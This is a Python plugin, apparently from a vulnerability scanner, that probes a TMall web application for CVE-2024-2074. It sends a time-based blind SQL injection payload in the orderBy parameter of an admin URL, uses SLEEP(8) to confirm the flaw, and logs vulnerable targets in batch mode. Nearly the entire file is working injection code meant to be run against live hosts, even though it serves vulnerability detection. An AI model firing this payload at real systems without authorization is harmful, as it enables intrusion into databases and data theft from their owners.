#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import time

import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Cve_2024_2074:
    def get_url(self,input_url):
        try:
            s = time.time()
            url = input_url + "/tmall/admin/user/1/1?orderBy=7,if((length(database())=11),SLEEP(8),0)"
            req = requests.get(url, headers=self.headers, proxies=self.proxy, verify=self.ssl)
            e = time.time()
            r = e - s
            if r > 8:
                OutPrintInfoSuc("TMall", f'目标存在CVE-2024-2074-SQL注入漏洞: {url}')
                if self.batch:
                    OutPutFile("tmall_2024_2074.txt",f'目标存在CVE-2024-2074-SQL注入漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("TMall", f'目标不存在CVE-2024-2074-SQL注入漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("TMall",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("TMall", '开始检测CVE-2024-2074-SQL注入漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("TMall", 'CVE-2024-2074-SQL注入漏洞检测结束')



